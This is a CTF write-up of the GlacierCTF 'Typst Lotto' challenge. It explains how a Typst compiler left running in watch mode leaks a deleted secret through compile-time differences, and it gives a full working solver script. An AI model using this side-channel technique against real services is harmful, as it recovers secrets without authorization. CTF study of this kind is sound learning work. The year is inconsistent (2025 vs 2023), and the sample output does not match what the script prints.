---
title: "GlacierCTF 2025 - Typst Lotto (Misc)"
date: "2025-11-25"
tags: ["Misc", "writeup", "GlacierCTF"]
summary: "A detailed write-up of the Typst Lotto challenge from GlacierCTF 2023, exploiting Typst's incremental compilation timing behavior."
image: "/blog/Glacier/typstlotto.png"
author: "Erwin Wijaya"
draft: false
featured: false
---

# Table of Contents
1. [Introduction](#introduction)  
2. [Challenge Overview](#challenge-overview)  
3. [Root Cause Analysis](#root-cause-analysis)  
4. [Side-Channel Leak: Incremental Compilation](#side-channel-leak-incremental-compilation)  
5. [Exploit Plan](#exploit-plan)  
6. [Full Solver Script](#full-solver-script)  
7. [Example Output](#example-output)  
8. [Conclusion](#conclusion)  

---

# Introduction

**Typst Lotto** was a side-channel challenge from GlacierCTF 2023.  
The goal was simple:

> **Guess a secret digit for 15 rounds in a row.**

But brute-forcing was impossible… unless you used the **timing side-channel leak** caused by Typst’s incremental compiler.

The challenge was essentially an **information leak through execution time**, similar to classical cache-timing attacks.

---

# Challenge Overview

The remote service performs the following actions:

1. The server generates one secret digit (0–9) each iteration.
2. It compiles a Typst document containing the secret.
3. It deletes the Typst source + PDF afterward.
4. The user may upload their own Typst code.
5. The server provides “profiling data” from Typst, including timestamps.

The vulnerability lies not in what the server **deletes**, but what it **keeps running**.

---

# Root Cause Analysis

The Typst compiler was executed in **watch mode**, which means:

- It keeps an **in-memory cache** of previous compilations
- Even if files are deleted from disk
- The next compilation is *incremental*
- Matching content results in a **cache hit**
- Mismatching content results in a **cache miss**

### The mistake:
The server deletes files (`main.typ`, `main.pdf`) using a `wipe()` function…  
…but it does **NOT restart** the Typst watch process.

Thus the **secret document is cached in memory.**

---

# Side-Channel Leak: Incremental Compilation

Consider this:

Admin compiles:

```
\n{iteration}{SECRET}\n
```

That exact content is stored in Typst's incremental cache.

Now the attacker uploads:

```
\n{iteration}{GUESS}\n
```

Two outcomes:

### ❌ Guess is WRONG  
Typst sees content change → MUST recompute syntax tree, layout, shaping  
→ **Slow** (~1300 μs)

### ✔️ Guess is CORRECT  
Typst detects identical content → SKIPS everything  
→ **Fast** (~400 μs)

This timing gap is consistent and easily measurable in the profiling JSON.

---

# Exploit Plan

To solve each iteration:

1. Brute-force all digits (0–9)
2. Upload the Typst doc containing the guess
3. Download the newest profiling JSON
4. Extract the final timestamp
5. The digit with the lowest timing is the secret
6. Submit the guess
7. Repeat for all 15 rounds

---

# Full Solver Script

```python
#!/usr/bin/env python3
from pwn import *
import base64
import json
import re
import time

context.log_level = 'info'

def solve():
    r = remote('challs.glacierctf.com', 13383)

    def upload_doc(text):
        r.sendlineafter(b'[>] Choose an option: ', b'1')
        payload = base64.b64encode(text.encode()).decode()
        r.recvuntil(b'[>] --- BASE64 INPUT START ---')
        r.sendline(payload.encode())
        r.sendline(b'@')
        r.recvuntil(b'[+] Uploaded document')
        r.recvuntil(b'[+] Document built')

    def get_profile_duration():
        while True:
            r.sendlineafter(b'[>] Choose an option: ', b'2')
            response = r.recvuntil([b'[>] Choose a file to download: ', b'[!] No profiling information available'])
            if b'No profiling' in response:
                time.sleep(0.5)
                continue
            break

        files_data = response.decode()
        matches = re.findall(r'profile/(\d+)\.json', files_data)
        if not matches:
            return float('inf')

        latest_id = max(int(m) for m in matches)
        latest_file = f"profile/{latest_id}.json"
        r.sendline(latest_file.encode())

        r.recvuntil(f'[+] --- {latest_file} OUTPUT START ---'.encode())
        json_content = r.recvuntil(f'[+] --- {latest_file} OUTPUT END ---'.encode(), drop=True)

        try:
            data = json.loads(json_content)
            if data and 'ts' in data[-1]:
                return float(data[-1]['ts'])
            return 0
        except:
            return float('inf')

    for iteration in range(15):
        r.recvuntil(f'[+] Iteration {iteration} of 15'.encode())
        print(f"[*] Solving iteration {iteration}...")

        timings = {}

        for guess in range(10):
            doc_content = f"\n{iteration}{guess}\n"
            upload_doc(doc_content)
            duration = get_profile_duration()
            timings[guess] = duration

        best_guess = min(timings, key=timings.get)
        print(f"[+] Best guess: {best_guess}")

        r.sendlineafter(b'[>] Choose an option: ', b'3')
        r.sendlineafter(b'[>] Take a guess: ', str(best_guess).encode())

        result = r.recvline().decode()
        if "lost" in result:
            print("[-] Failed.")
            exit(1)
        print(f"[+] Correct! {result.strip()}")

    r.interactive()

if __name__ == "__main__":
    solve()
```

---

# Example Output

```
[*] Solving iteration 0...
[+] Best guess: 7 (Time: 808.62 vs Avg: 1395.53)
...
[*] Solving iteration 14...
[+] Best guess: 8 (Time: 425.03 vs Avg: 1298.52)
[+] You win :) gctf{b7c86a8166_th4nks_f0r_pl4y1ng_th3_typst_l0tt0_a59050c8e}
```

---

# Conclusion

Typst Lotto is a textbook example of how:

- long-running processes leak state,
- incremental compilation behaves like a cache,
- timing side-channels reveal hidden secrets.

Even though files were deleted, the Typst cache allowed us to recover secrets across 15 rounds.

**Final Flag:**  
`gctf{b7c86a8166_th4nks_f0r_pl4y1ng_th3_typst_l0tt0_a59050c8e}`
